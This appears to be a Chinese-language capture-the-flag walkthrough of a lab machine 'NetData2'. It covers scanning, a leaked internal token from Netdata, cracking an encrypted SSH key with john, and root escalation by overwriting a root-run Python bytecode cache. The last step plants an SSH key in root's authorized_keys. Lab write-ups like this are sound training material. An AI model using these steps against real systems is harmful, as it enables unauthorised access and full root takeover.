@@ -1,0 +1,233 @@
+---
+title: 1. NetData2
+sidebar_position: 2
+---
+
+# NetData2
+
+IP：`192.168.101.147`
+
+- user flag：`flag{user-038b7528863a88af09ef985247ffc3ec}`
+- root flag：`flag{root-57ef9bf79ec87b8179360756328fc252}`
+
+## 一、信息收集
+
+```bash
+rustscan -a 192.168.101.147
+```
+
+```
+Open 192.168.101.147:22
+Open 192.168.101.147:80
+Open 192.168.101.147:8443
+Open 192.168.101.147:19999
+```
+
+```bash
+nmap -sV -sC -p 22,80,8443,19999 192.168.101.147
+```
+
+```
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 10.3 (protocol 2.0)
+80/tcp    open  http     Apache httpd 2.4.67 ((Unix))
+|_http-title: dprod - Digital product design agency
+|_http-server-header: Apache/2.4.67 (Unix)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+8443/tcp  open  http     Werkzeug httpd 3.1.8 (Python 3.14.5)
+|_http-title: Site doesn't have a title (application/json).
+|_http-server-header: Werkzeug/3.1.8 Python/3.14.5
+19999/tcp open  dnp-sec?
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|     Server: Netdata Embedded HTTP Server v1.47.5
+|     Access-Control-Allow-Origin: *
+|     Access-Control-Allow-Credentials: true
+|     Date: Tue, 25 Aug 2026 01:33:58 GMT
+|     Content-Type: text/plain; charset=utf-8
+|     Cache-Control: no-cache, no-store, must-revalidate
+|     Pragma: no-cache
+|     Expires: Tue, 25 Aug 2026 01:33:58 GMT
+|     Content-Length: 43
+|     X-Transaction-ID: 52ca31da4c4f45e2ba66257eaeed416c
+|     HTTP method requested is not supported...
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Connection: close
+|     Server: Netdata Embedded HTTP Server v1.47.5
+|     Access-Control-Allow-Origin: *
+|     Access-Control-Allow-Credentials: true
+|     Date: Wed, 13 May 2026 08:37:07 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Cache-Control: public
+|     Expires: Thu, 14 May 2026 08:37:07 GMT
+|     Content-Length: 39655
+|     X-Transaction-ID: 433ecf338ac5454582a496b1d01c8508
+|     <!doctype html><html lang="en"><head><title>netdata dashboard</title><meta name="application-name" content="netdata"><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="author" content="costa@tsaousis.gr"><link rel=
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Connection: close
+|     Server: Netdata Embedded HTTP Server v1.47.5
+|     Access-Control-Allow-Origin: *
+|     Access-Control-Allow-Credentials: true
+|     Date: Tue, 25 Aug 2026 01:33:58 GMT
+|     Content-Type: text/plain; charset=utf-8
+|     Access-Control-Allow-Methods: GET, OPTIONS
+|     Access-Control-Allow-Headers: accept, x-requested-with, origin, content-type, cookie, pragma, cache-control, x-auth-token
+|     Access-Control-Max-Age: 1209600
+|     Content-Length: 2
+|_    X-Transaction-ID: 1380c75f339248e9a6e20d84fd5e9002
+```
+
+## 二、漏洞复现
+
+NetData 版本：netdata v1.47.5
+
+在泄露的信息当中，我们得到了这样一组关键的 JSON 信息
+
+```json
+"host_labels": {
+    "_internal_api_auth_header": "X-Internal-Auth",
+    "_internal_api_auth_token": "s3cr3t_t0k3n_f0r_4dm1n",
+    "_internal_api_url": "http://127.0.0.1:8443/api/flag"
+}
+```
+
+数据暴露了 Port 8443 的 Werkzeug/Flask 应用中存在一个仅限本地（127.0.0.1）或者特定鉴权才能访问的接口 `/api/flag`
+
+而在我们的 Nmap 扫描中是对外开放的（0.0.0.0:8443），我们可以直接从外部携带以上得到的 Header 发送请求，来获取信息
+
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl -s -X GET "http://192.168.101.147:8443/api/flag" \
+     -H "X-Internal-Auth: s3cr3t_t0k3n_f0r_4dm1n"
+{"flag":"/b7a46cd4-3c6a-4fe9-b432-6aa60fc1c0d7"}
+```
+
+得到 `{"flag":"/b7a46cd4-3c6a-4fe9-b432-6aa60fc1c0d7"}`，因为带着 `/`（斜杠），或许它是一个路径吧，尝试直接访问
+
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cat << 'EOF' > id_ecdsa
+heredoc> -----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDnJvarBy
+AaK0VHGUqzKvNJAAAAGAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
+dHAyNTYAAABBBAu0vOq2iiKpRafaALDAzdld1q7etogfJpUys7uQkh0yssPHIOGIlnCVmk
+fH+597ZZUha++8yznavl8rqIn4BZcAAACwIeMia8+vQg3Pds4BWlqyuiElAH9cHiZIzeoJ
++awY0UEJFz3Dkrl3ja9wN4mGDnPJ/o9sblQstTDcEKSz9CluQ0MWrAgZ0IM8rmp/b1/NCH
++dAiQcFgnGllwiBvqn+HLzonSdiDa8t2FY7e1PCNwhehmANepB47bl0GbNN+DLiIbr2NK9
+Tf4hR4lkfDAJNCuNcAYPFGdeJiSYHZ5pz23C/EdTq4zx1L5fWTedbBgRwUc=
+-----END OPENSSH PRIVATE KEY-----
+heredoc> EOF
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ chmod 600 id_ecdsa
+```
+
+这是一串经过加密的 OpenSSH 私钥（ECDSA 类型）
+
+提取哈希，使用 rockyou 字典进行爆破
+
+```bash
+ssh2john id_ecdsa > key_hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt key_hash.txt
+```
+
+```
+Press 'q' or Ctrl-C to abort, almost any other key for status
+legolas          (id_ecdsa)
+1g 0:00:00:39 DONE (2026-08-24 22:10) 0.02552g/s 21.23p/s 21.23c/s 21.23C/s lizzie..legolas
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+转换私钥并且去除密码
+
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh-keygen -p -f id_ecdsa -P legolas -N ""
+Key has comment 'kendrals@Maze'
+Your identification has been saved with the new passphrase.
+```
+
+获得了一个用户信息，`kendrals@Maze`，成功的登录到靶机内
+
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh -i id_ecdsa kendrals@192.168.101.147
+              _
+__      _____| | ___ ___  _ __ ___   ___
+\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
+ \ V  V /  __/ | (_| (_) | | | | | |  __/
+  \_/\_/ \___/|_|\___\___/|_| |_| |_|\___|
+
+kendrals@Netdata2:~$ ls -al
+total 16
+drwxr-sr-x 3 kendrals kendrals 4096 Jul  4 20:11 .
+drwxr-xr-x 4 root     root     4096 Jul  4 20:09 ..
+drwx--S--- 2 kendrals kendrals 4096 Jul  4 20:10 .ssh
+-rw-r--r-- 1 kendrals kendrals   44 Jul  4 20:11 user.txt
+```
+
+## 三、权限提升
+
+上传 LinPEAS 进行扫描后分析结果，可能的提权链为：
+
+`kendrals -> root 的 cron -> 可写 python 的字节码缓存 -> root`
+
+```bash
+kendrals@Netdata2:~$ python3 - <<'PY'
+> from pathlib import Path
+import marshal
+
+p = Path("/opt/backup/__pycache__/backup_utils.cpython-314.pyc")
+old = p.read_bytes()
+
+payload = """
+from pathlib import Path
+Path('/home/kendrals/root_flag_copy').write_text(
+    Path('/root/root.txt').read_text()
+)
+"""
+
+p.write_bytes(old[:16] + marshal.dumps(compile(payload, "<backup_utils>", "exec")))
+> PY
+
+kendrals@Netdata2:~$ cat root_flag_copy
+flag{root-57ef9bf79ec87b8179360756328fc252}
+```
+
+拿到 root-shell，Python 注入是 root 执行的。最稳妥的方式是让 root 任务把当前用户的 SSH 公钥写入 `/root/.ssh/authorized_keys`，然后 SSH 登录 root
+
+```bash
+python3 - <<'PY'
+from pathlib import Path
+import marshal
+
+p = Path("/opt/backup/__pycache__/backup_utils.cpython-314.pyc")
+old = p.read_bytes()
+
+payload = """
+import os
+import shutil
+
+os.makedirs('/root/.ssh', mode=0o700, exist_ok=True)
+shutil.copyfile(
+    '/home/kendrals/.ssh/id_ecdsa.pub',
+    '/root/.ssh/authorized_keys'
+)
+os.chown('/root/.ssh', 0, 0)
+os.chown('/root/.ssh/authorized_keys', 0, 0)
+os.chmod('/root/.ssh/authorized_keys', 0o600)
+"""
+
+p.write_bytes(old[:16] + marshal.dumps(compile(payload, "<backup_utils>", "exec")))
+PY
+
+ssh -i /home/kendrals/.ssh/id_ecdsa root@127.0.0.1
+```
+
+输入我们从 web 层面得到的 key，`legolas`，最终拿到 root 权限
